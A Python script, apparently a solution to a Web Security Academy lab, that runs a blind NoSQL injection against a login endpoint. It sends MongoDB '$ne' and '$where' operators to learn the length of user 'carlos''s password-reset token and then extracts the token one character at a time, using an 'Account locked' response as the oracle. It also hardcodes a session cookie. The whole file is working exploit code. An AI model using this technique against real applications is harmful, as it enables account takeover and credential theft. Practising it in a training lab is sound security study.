#!/usr/bin/env python3
import requests
import string

url = "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/login"
headers = {
    "Cookie": "session=CInUWYnpHEMIbjBVttgAfw3X7oTxjSRc",
    "Content-Type": "application/json"
}

# First find the length of the resetPwdToken
print("Finding resetPwdToken length for carlos...")
token_length = 0

for length in range(1, 50):
    payload = {
        "username": "carlos",
        "password": {"$ne": "invalid"},
        "$where": f"this.resetPwdToken && this.resetPwdToken.length == {length}"
    }

    response = requests.post(url, headers=headers, json=payload)
    if "Account locked" in response.text:
        token_length = length
        print(f"Token length: {length}")
        break

if token_length == 0:
    print("Could not determine token length")
    exit()

# Now extract each character
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
token = ""

print(f"\nExtracting {token_length} character token...")

for position in range(token_length):
    found = False
    for char in charset:
        payload = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": f"this.resetPwdToken && this.resetPwdToken[{position}] == '{char}'"
        }

        response = requests.post(url, headers=headers, json=payload)
        if "Account locked" in response.text:
            token += char
            print(f"Position {position}: {char} (Token so far: {token})")
            found = True
            break

    if not found:
        print(f"Could not find character at position {position}")
        break

print(f"\nCarlos' complete resetPwdToken: {token}")